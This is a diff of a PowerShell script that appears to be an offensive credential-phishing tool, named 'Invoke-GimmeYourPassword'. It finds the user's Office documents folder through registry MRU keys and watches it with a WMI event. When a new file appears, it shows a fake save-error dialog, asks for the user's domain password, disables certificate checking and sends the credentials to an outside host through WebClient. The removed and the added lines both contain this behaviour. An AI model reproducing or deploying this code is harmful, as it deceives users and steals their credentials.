@@ -1,62 +1,119 @@
-#here to simplify testing 
- #$ErrorActionPreference = "silentlyContinue" 
- #This is not used currently 
-     #$URLAddress= "https://200.200.32.134" 
- get-eventsubscriber | unregister-event -verbose
- remove-variable MostRecentEntry 
-  
-  
- ###################################### 
- #Search for Office based on Registry keys.  
-   
-if (test-path HKLM:\SOFTWARE\Microsoft\Office\15.0) { 
-      
- 	if (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\")  { 
- 		write-output "MRU path exists" 
- 		$MostRecentEntry="C:\Users\ofpagua\Documents" 
- 		} 
- } 
+function obtain-path() {
+    param (
+    [string]$Path,
+    [int]$Source
+    )
+    
+        $pathSplit=$path.split("\")
+        $pathOnly= $pathSplit[0 .. $($pathSplit.length -2) ]
+        $pathOnly = $pathOnly -join "\"
+        if ($source -eq 1) {
+            #Non invoke chain
+           #write-output "Source is equal to 1"
+            return $pathOnly
+        }         
+        elseif ($source -eq 2) {
+            #Invoke chain 
+            $pathToMonitor = $pathOnly
+            $pathToMonitor = $pathToMonitor.split("\")
+            $pathToMonitorDriverLetter=$pathToMonitor[0]
+            $pathToMonitorPathRemainder=$pathToMonitor[1..$pathToMonitor.Length] -join "\\"
+            $pathToMonitorPathRemainder = "\\" + $pathToMonitorPathRemainder + "\\"
+            $myarray=@()
+            $myarray+=$pathToMonitorDriverLetter
+            $myarray+=$pathToMonitorPathRemainder
+            return $myarray
+        }
+        
+} 
 
-  
- #No office found, Lets get path. 
- if (! $MostRecentEntry )	{ 
- 	#$MostRecentEntry=read-host "provide path" 
- 	$MostRecentEntry="Z:\demo" 
- } 
-  
-  
- $pathToMonitor = $MostRecentEntry 
- $pathToMonitor = $pathToMonitor.split("\") 
- $pathToMonitorDriverLetter=$pathToMonitor[0] 
- $pathToMonitorPathRemainder="\\" + $pathToMonitor[1..$pathToMonitor.Length] -join "\\" 
-  
- $pathToMonitorPathRemainder = $pathToMonitorPathRemainder + "\\" 
-  
-  
-  
-  
-  
-  
- $localComputerName=$env:COMPUTERNAME 
- $query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'") 
-  
- register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action {  
-     $global:MyEVT=$event 
-     $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename 
-     $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension 
-     $modDriveLetter=$event.sourceEventArgs.newevent.TargetInstance.Drive 
-     $modfilenameExtension=$modfilename+"."+$modExtension 
-  
-     Add-Type -AssemblyName Microsoft.VisualBasic 
-     [Microsoft.VisualBasic.Interaction]::MsgBox("Unable to reach $modDriveLetter Drive. File $modFileNameExtension was not saved", 'okonly,SystemModal,Information', "Error saving file") 
-     $cred = $host.ui.promptforcredential("Enter password to reconnect the $modDriveLetter drive",'',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; 
 
-#$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-    $wc = new-object net.webclient;
-    $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
-    $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
-    $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
-    $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
-    $result = $wc.downloadstring("http://172.16.7.137")
-    } 
+function search-keys { 
+    #Include an optional parameter. This will determine how the function obtain path works. 
+    #If the INVOKE flag is present we will set the source to two, as we need to return additional parameters for the temporary WMI portion. 
+	param (
+	[switch]$Invoke
+	)
+    if (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
+    {
+        write-output "hit 2 MRU path exists"
+        $pathToMonitor="Z:/demo"
+    }
+    elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
+	{
+       	write-output "hit 1 MRU path exists"
+		$pathToMonitor="C:\Users\octavio\Documents"
+	}
+	elseif (test-path "HKCU:\Software\Microsoft\Office\14.0\Word\File MRU" ) 
+    {
+        $officeVersion="Office who knows"
+        write-output "hit 2 MRU path exists"
+        $pathToMonitor="C:\Users\octavio\Documents"
+    }
+	elseif (test-path "HKCU:\Software\Microsoft\Office\12.0\Word\File MRU")				
+	{
+	   write-output "hit 3 MRU path exists"
+	   $pathToMonitor="C:\Users\octavio\Documents"
+	}
+	elseif (test-path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List") 
+    {
+        $pathToMonitor=(get-itemproperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List").file1
+        #write-output $pathToMonitor
+    }
+    if ($Invoke)
+	{
+	#If Invoke present
+    $returnValues=obtain-path -source 2 -path $pathToMonitor    
+    $returnValues
+    return $returnValues
+    }
+	else 
+    {
+	#Use this path if $invoke is not present. 
+      #write-output "source set to 1"
+      obtain-path -source 1 -path $pathToMonitor
+    }
+	
+
+}
+
+function start-tempsubscription{
+    param (
+        [string]$pathToMonitorDriverLetter,
+        [string]$pathToMonitorPathRemainder
+    )
+    $localComputerName=$env:COMPUTERNAME
+    $query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'")
+    
+    register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action { 
+    $global:MyEVT=$event
+    write-host  "event occurred" 
+    $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename
+    $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension
+    $modDriveLetter=$event.sourceEventArgs.newevent.TargetInstance.Drive
+    $modfilenameExtension=$modfilename+"."+$modExtension
+
+    Add-Type -AssemblyName Microsoft.VisualBasic
+    [Microsoft.VisualBasic.Interaction]::MsgBox("Unable to reach $modDriveLetter Drive. File $modFileNameExtension was not saved", 'okonly,SystemModal,Information', "Error saving file")
+    $cred = $host.ui.promptforcredential("Enter password to reconnect the $modDriveLetter drive",'',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+    if ($cred) {
+        $wc = new-object net.webclient;
+        $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stae (Red Hat modified)");
+        $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+        $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
+        $result=$wc.downloadstring('https://200.200.32.134:443');
+        }
+    
+  }
+    }
+
+function Invoke-GimmeYourPassword {
+	$pathToMonitor=search-keys -Invoke
+    write-output $pathToMonitor[0]
+    write-output $pathToMonitor[1]
+    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1]
+    #write-output $pathToMonitor[0]
+    #write-output $pathToMonitor
+    
+}
